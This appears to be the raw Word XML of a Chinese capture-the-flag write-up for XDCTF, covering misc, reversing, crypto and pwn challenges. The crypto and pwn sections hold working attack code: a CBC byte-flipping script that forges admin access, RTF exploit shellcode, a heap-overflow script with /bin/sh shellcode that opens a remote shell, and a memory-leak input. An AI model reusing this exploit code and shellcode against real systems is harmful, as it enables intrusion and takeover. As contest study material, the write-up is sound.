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MISC100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="STSong" w:hAnsi="STSong" w:eastAsia="STSong" w:cs="STSong"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>根据提示搜到项目：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"https://github.com/mbikovitsky/BrainTools"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https://github.com/mbikovitsky/BrainTools</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>编译好后使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
        </w:rPr>
        <w:t>bftools decode braincopter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://xdctf.com/static/uploads/b7bbf228087020ce214b219997135b99/zzzzzzyu.png" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
        </w:rPr>
        <w:t>zzzzzzyu.png</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="16"/>
          <w:rFonts w:ascii="Courier New"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:t>得到：</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>+++++++++[-&gt;+++++++++&lt;]&gt;+++++++.&lt;++++[-&gt;----&lt;]&gt;----.-.&lt;++++[-&gt;++++&lt;]&gt;+.&lt;+++[-&gt;-- -&lt;]&gt;-----.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.&lt;++++[-&gt;----&lt;]&gt;-.-.&lt;++++++[-&gt;------&lt;]&gt;------ ------.--------.-.---.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++.---.+++.&lt;++++++[-&gt;------&lt;]&gt;--- ----.&lt;+++++++[-&gt;+++++++&lt;]&gt;.+++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-.---.&lt;+++++++[-&gt;+++++ ++&lt;]&gt;+++++++++++.++++++.+.+++++.-------.+.&lt;+++[-&gt;+++&lt;]&gt;+++++.&lt;++++++++++[-&gt;----- -----&lt;]&gt;----------------.++++++.+.+++++.-------.+.&lt;+++[-&gt;+++&lt;]&gt;+++++.&lt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>通过在线BrainFuck解释器得到明文：XDCTF{ji910-dad9jq0-iopuno}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>MISC200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="916"/>
        </w:tabs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</w:pP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工具用对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就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简单了</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="916"/>
        </w:tabs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</w:pP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reyoukid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ding下载后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改成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zip,在xp环境下修复，出来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 xml:space="preserve">rebuilt.areyoukiddi.zip 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pict>
          <v:shape id="图片 5" o:spid="_x0000_s1026" type="#_x0000_t75" style="height:75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tabs>
          <w:tab w:val="clear" w:pos="916"/>
        </w:tabs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</w:pP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把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readme.txt复制出来。制作成压缩包。然后利用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Advanced ZIP Password Recovery进行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plain</w:t>
      </w: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-text attack 很快就解密了</w:t>
      </w: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t>flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="916"/>
        </w:tabs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</w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="STSong" w:hAnsi="STSong" w:eastAsia="STSong" w:cs="STSong"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>XDCTF{biiubiiiiiiiiiiiiiiiu&amp;ddddyu}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl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REVERSE 100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>使用IDA查看关键函数：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
      </w:pP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pict>
          <v:shape id="Picture 1" o:spid="_x0000_s1027" type="#_x0000_t75" style="height:221.7pt;width:408.7pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="2397f" croptop="2098f" cropright="1130f" cropbottom="7383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widowControl/>
      </w:pPr>
      <w:r>
        <w:t>一开始那个ptrace是反调试，nop掉就好了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
      </w:pPr>
      <w:r>
        <w:t>然后输入一串字符串之后，先进行异或操作，然后拆分成四个部分调换了位置，再对一些值比较小的进行处理，最后与另一个字符串进行比较。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
      </w:pPr>
      <w:r>
        <w:t>不过查看最后被比较的另一个字符串的调用：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
      </w:pP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pict>
          <v:shape id="Picture 3" o:spid="_x0000_s1028" type="#_x0000_t75" style="height:84.7pt;width:397.15pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="14451f" croptop="24273f" cropright="14444f" cropbottom="28242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widowControl/>
      </w:pPr>
      <w:r>
        <w:t>可以找到一个类似的函数，主体实现过程都一样，区别就在于一开始异或的时候有没有对常数7进行异或：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="STSong" w:hAnsi="STSong" w:eastAsia="STSong" w:cs="STSong"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:pict>
          <v:shape id="Picture 4" o:spid="_x0000_s1029" type="#_x0000_t75" style="height:210.4pt;width:409.4pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="2397f" croptop="2099f" cropright="1024f" cropbottom="10240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widowControl/>
      </w:pPr>
      <w:r>
        <w:t>这也就是题目提示“Don't believe your eyes~!”的意思：真正看到的并不是对的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
      </w:pPr>
      <w:r>
        <w:t>写了个程序解密：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#include&lt;stdio.h&gt;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#include&lt;string.h&gt;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tran(char *a1,int a2,int a3)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v3;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result;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i=0;;++i)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result = a2/2;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if(result &lt;= i)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break;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v3=a1[i];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a1[i]=a1[a2-i-a3/2-1];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a1[a2-i-a3/2-1]=v3;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widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pP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input[]="AbCdEfGhIjKl";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str[]="ZzAwZF9DcjRrM3JfZzBfb24=";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key[]=";%#848N!0Z?7'%23]/5#1\"YX";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str2[100];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tran(key,24,12);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for(int i=0;i&lt;24;i++)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str2[i] = key[i] ^ str[i];// ^ 0x7;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printf("%d.%c (%d)\n",i,str2[i],str2[i]);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一共输出了24个字母，其中前12个和后12个应该一样的。这个程序还会出现一些不一样的情况，是因为没有考虑对比较小的进行的处理，可以对其中不对的地方手工修改。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最后得到flag：u'rE_aweS0me</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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REVERSE200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程序里面有很多反调试的东西，使用原版OD直接加载的话就直接弹框加载失败，不过使用吾爱破解版OD直接无视各种反调试。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关键代码被加密了，在程序中有一处会进行异或解密。使用脚本解密之后关键函数的其实部分大概是这样的：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts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Picture 6" o:spid="_x0000_s1030" type="#_x0000_t75" style="height:352.6pt;width:404.2pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="4104f" croptop="1896f" cropright="19223f" cropbottom="2276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程序中有很多花指令，导致使用IDA不能正确F5。不过有些函数将花指令nop掉之后还是可以F5的。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前面会对几个特殊位置进行判断，过程比较繁琐。Flag的大部分是通过这几条指令判断的：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts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Picture 9" o:spid="_x0000_s1031" type="#_x0000_t75" style="height:308.65pt;width:189.7pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="22424f" croptop="7029f" cropright="28668f" cropbottom="19342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通过OD一步一步跟，逐步修改flag就能得到最终的flag：XDCTF{Congra_tUlat$eyOu}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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REVERSE300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题目是一个一行的Python代码。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手工拆分了一下，拆到这样就拆不下去了：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__g = globals()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__y = (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)())))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string = (__import__('string', __g, __g))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table = (string.printable.strip())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setbit = (lambda p, pos, value: (lambda __l: [[[(lambda __target, __slice, __value: [(lambda __target, __slice, __value: [__l['p'] for __target[__slice] in [((lambda __old: (lambda __ret: __old | __value if __ret is NotImplemented else __ret)(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (__l['value'] &lt;&lt; __l['bpos'])) for __target[__slice] in [((lambda __old: (lambda __ret: __old &amp; __value if __ret is NotImplemented else __ret)(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (~(1 &lt;&lt; __l['bpos']))) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'], __l['value'] in [(p, pos, value)]][0])({}))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setbit.__name__ = 'setbit'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getbit = (lambda p, pos: (lambda __l: [[[((__l['p'][__l['cpos']] &gt;&gt; __l['bpos']) &amp; 1) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'] in [(p, pos)]][0])({}))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getbit.__name__ = 'getbit'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encode = (lambda data, buf: (lambda __l: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[__this() for __l['data'][__l['i']] in [((table.index(__l['data'][__l['i']]) + 1))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])), lambda: (lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[[__this() for __l['buf'] in [(setbit(__l['buf'], __l['i'], getbit(__l['data'], __l['j'])))]][0] for __l['j'] in [((((__l['i'] / 6) * 8) + (__l['i'] % 6)))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))]][0] for __l['data'], __l['buf'] in [(data, buf)]][0])({}))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encode.__name__ = 'encode'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 = open('flag.txt', 'r')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 = fin.read().strip()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fin.close()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ss = ([])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sss = ([])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__items0 = iter(s)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__after0 = lambda: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(lambda __value: [__this() for __g['sssss'] in [((lambda __ret: __g['sssss'] + __value if __ret is NotImplemented else __ret)(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value)))]][0])(chr(c)) for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(ssss), lambda: [(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], []) for __g['sssss'] in [('')]][0] for __g['ssss'] in [(encode(ss, sss))]][0]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__sentinel0 = []</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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__y(lambda __this: lambda: (lambda __i: [(ss.append(c), (sss.append(0), __this())[1])[1] for __g['c'] in [(__i)]][0] if __i is not __sentinel0 else __after0())(next(__items0, __sentinel0)))()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这个代码与原代码是等效的，不过更清晰一点。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一开始的setbit和getbit两个函数看函数名就能猜出个大概，然后在用下就能知道其作用。不过其第一个参数是个数组，操作中的bit位数是在整个数组中的位数。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关键加密方式依然很难看懂，不过也能看个大概，其中最关键的地方在这里：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[[[__this() for __l['buf'] in [(setbit(__l['buf'], __l['i'], getbit(__l['data'], __l['j'])))]][0] for __l['j'] in [((((__l['i'] / 6) * 8) + (__l['i'] % 6)))]][0] for __l['i'] in [(__i)]]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在配合着通过修改flag.txt看变量ss和sss的变化就能猜出加密方法：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将输入转化为在数组</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>string.printable.strip()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>中的位置，然后取后6个字节拼在一起。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因为只取了后6个字节，而第7个字节有可能为0也有可能为1，所以反解的时候两个都要考虑到。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两种情况分别得到：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pP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Picture 11" o:spid="_x0000_s1032" type="#_x0000_t75" style="height:38.4pt;width:377.8pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="3777f" croptop="18440f" cropright="4219f" cropbottom="39297f" gain="65536f" blacklevel="0f" gamma="0" o:title="IMG20151003012046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然后拼接一下得到flag：xdctf{0ne-l1n3d_Py7h0n_1s_@wes0me233}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>CRYPT200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>CBC Byte Flipping Attack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Payload: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from pwn import *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sh = remote('133.130.52.128',6666)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target = ";admin=true"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email = '0000000000000000000000'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prefix = "comment1=wowsuch%20CBC;userdata="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suffix = ";coment2=%20suchsafe%20very%20encryptwowww"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ptxt = prefix + email + suffix</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pP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sh.send('mkprof:' + email)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sh.recv(1024)[0:len(ptxt)*2]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list(s.decode('hex'))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i in range(len(target)):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s[32+i] = p8( u8(s[32+i]) ^ u8(target[i]) ^ u8(ptxt[48+i]) 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''.join(s).encode('hex')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sh.send('parse:' + s)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>print sh.recv(1024)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貌似flag忘了存了</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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PWN100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给的是一个rtf文件，然后在网上搜了一个几乎完全一样的rtf文件：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"https://www.exploit-db.com/exploits/36207/" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="17"/>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>https://www.exploit-db.com/exploits/36207/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/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唯一不同的部分在shellcode处。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提取出本题的shellcode，写程序调试shellcode：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#include&lt;stdio.h&gt;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char str[]="\x4a\xd6\x90\x96\x96\x47\x46\x96\xfd\xd6\x2f\x92\x4a\x96\x91\x4e\x47\x27\x4a\x43\xf5\x4a\x9b\xd6\x47\x42\x2f\x43\xd6\x4e\x97\x92\x9b\x9b\x46\x4a\x4b\x47\x41\x43\x92\xf9\x90\x97\xf9\x3f\x41\x49\x41\xfd\x4a\x97\xf9\x42\x47\xfc\x3f\x91\x4a\x42\x4b\x37\x93\x4f\x97\x41\x3f\x2f\x91\x97\x98\x49\x3f\x47\x4a\x4b\x3f\xfd\x41\x4b\xd6\x27\x4a\x9b\x91\x47\x9b\x41\x40\x47\xf5\x37\x43\x3f\xfd\x90\x46\x27\x93\x93\x97\x99\x4f\x99\x3f\x4a\x2f\x3f\x4b\x4e\xfd\x2f\x99\x97\x37\x91\xfc\x48\x37\x47\xfd\x4e\xf8\x4b\xfd\xd6\x99\x97\x46\xfd\x46\x48\x43\x37\x90\x4a\x4a\xf8\x97\x3f\x3f\x91\x43\x49\x92\x41\x4a\x90\xfd\xf9\x2f\x90\x37\x46\x92\x4b\x90\x4b\x37\x43\x43\xf9\xfc\xd6\x40\xfc\xf8\x46\x97\x48\x9b\xfd\x27\x40\x46\x47\x40\x96\x48\xf5\x49\x43\x93\x4f\xf9\x48\xf8\x4a\x91\x37\x43\x2f\x91\xf9\x4b\x91\x9f\x49\x9f\xf5\x3f\x3f\x92\x4e\x96\x42\x4e\x46\xd6\xfd\x4b\xf8\xfc\x43\x49\x91\x9f\xfc\x3f\xfd\x43\xfd\x3f\xfd\x99\x4b\x2f\x9b\xd6\xd6\xfd\x98\x27\x96\x4f\x40\x4e\x9f\x4a\xfd\x90\x9b\x9b\x49\x9b\x98\x46\x4f\x96\x92\x9f\xf5\x96\x3f\x96\x2f\x91\x91\x4f\x4b\x47\xf9\x98\x40\x9b\x91\x48\x90\x99\x96\xeb\x04\xfc\x4b\x3f\x92\x81\xc4\x54\xf2\xff\xff\xda\xd5\xb8\x11\x1f\xd3\x7b\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x43\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2\xe4\xe3\x3b\xf9\x06\x1c\xbc\x9e\x8f\xf9\x8d\x9e\xeb\x8a\xbe\x2e\x78\xde\x32\xc4\x2c\xcb\xc1\xa8\xf8\xfc\x62\x06\xde\x33\x72\x3b\x22\x55\xf0\x46\x76\xb5\xc9\x88\x8b\xb4\x0e\xf4\x61\xe4\xc7\x72\xd7\x19\x63\xce\xeb\x92\x3f\xde\x6b\x46\xf7\xe1\x5a\xd9\x83\xbb\x7c\xdb\x40\xb0\x35\xc3\x85\xfd\x8c\x78\x7d\x89\x0f"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\xa9\x4f\x72\xa3\x94\x7f\x81\xba\xd1\xb8\x7a\xc9\x2b\xbb\x07\xc9\xef\xc1\xd3\x5c\xf4\x62\x97\xc6\xd0\x93\x74\x90\x93\x98\x31\xd7\xfc\xbc\xc4\x34\x77\xb8\x4d\xbb\x58\x48\x15\x9f\x7c\x10\xcd\xbe\x25\xfc\xa0\xbf\x36\x5f\x1c\x65\x3c\x72\x49\x14\x1f\x19\x8c\xab\x25\x6f\x8e\xb3\x25\xc0\xe7\x82\xae\x8f\x70\x1b\x65\xf4\x8f\x56\x24\x5d\x18\x3e\xbc\xdf\x45\xc1\x6a\x23\x70\x41\x9f\xdc\x87\x59\xea\xd9\xcc\xde\x06\x90\x5d\x8a\x28\x07\x5d\x9f\x4a\xca\xc5\x31\xe8\x6c\x63\x6d\xdd\xef\x4b\x08\x42\x98\xe4\xf2\xfc\x3c\x98\x86\x9a\xc7\x3a\x52\x3c\x0d\xab\xab\x9d\x0b\x5e\x94\x45\xe0\x91\x75\xf1\x38\x8d\xef\xce\x09\x4c\xcf\x0e\x4a\xcd\x35\x33\xec\x7d\x28\xac\xde\x09\xd2\x46\x3f\xd4\x04\x87\x5e\x6c\x3c\xb5\xc9\xee\x9c\x5a\x30\xb3\xba\xf0\x25\x2c\x6c\x7d\xde\xc6\x50\x56\x76\x27";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__asm{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lea eax,str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push eax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ret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OD跟一下发现生成了C:\flag.txt，得到flag：xdctf{d4_5h1_fu_d41_w0_f31}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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PWN300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这个是对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Plaid CTF 2014</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>的ezhp题目进行了一些修改，网上有几篇关于这道题的介绍。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我也从网上找了一个payload改了改：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from pwn import *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os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time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sys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pP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 send_recv_until(sock, senddata, keyword):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sock.send(senddata)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msg = ""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while 1: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tmp = sock.recv(1024)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msg += tmp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if keyword in msg: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break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msg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sock = remote('133.130.90.210',6666)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"1\n0\n",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"1\n0\n",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"1\n0\n",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"3\n0\n1\n", "Give")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"Q"*(120+4),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= send_recv_until(sock, "4\n0\n",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"3\n1\n1\n", "Give")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"Q"*(120-4)+struct.pack('&lt;I', 0x804b01c-8)+p32(u32(data[150:154])+0xc),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"2\n2\n",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"3\n0\n1\n", "Give")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send_recv_until(sock, "L"*54+"\x31\xc0\x31\xdb\x31\xc9\xb3\x04\xb1\x03\xb0\x3f\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\n", "option")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sock.send("5\n")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sock.interactive()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貌似flag也忘了存了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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PWN400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非常简单的一道题，完全不值这个分值。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关键位置：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts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Picture 12" o:spid="_x0000_s1033" type="#_x0000_t75" style="height:14.35pt;width:463.9pt;rotation:0f;" o:ole="f" fillcolor="#FFFFFF" filled="f" o:preferrelative="t" stroked="f" coordorigin="0,0" coordsize="21600,21600">
            <v:fill on="f" color2="#FFFFFF" focus="0%"/>
            <v:imagedata cropleft="22993f" croptop="33956f" cropright="11152f" cropbottom="29962f"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左边的是输入的文件长度，右边大概是剩余程度。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只要v13为0xFFFF的时候由于溢出通过判断，然后程序会将内存中一大片都显示出来，因为之前已经把flag读到内存中了，所以可以看到flag。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只要把这个发过去就好了：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'a'*10+'PK\x01\x02'+'a'*24+'\xff\xff'+'a'*26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貌似flag同样忘了存了</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pP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/>
          <w:b/>
          <w:i w:val="0"/>
          <w:kern w:val="44"/>
          <w:sz w:val="32"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:kern w:val="44"/>
          <w:sz w:val="32"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>EB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:kern w:val="44"/>
          <w:sz w:val="32"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:kern w:val="44"/>
          <w:sz w:val="32"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
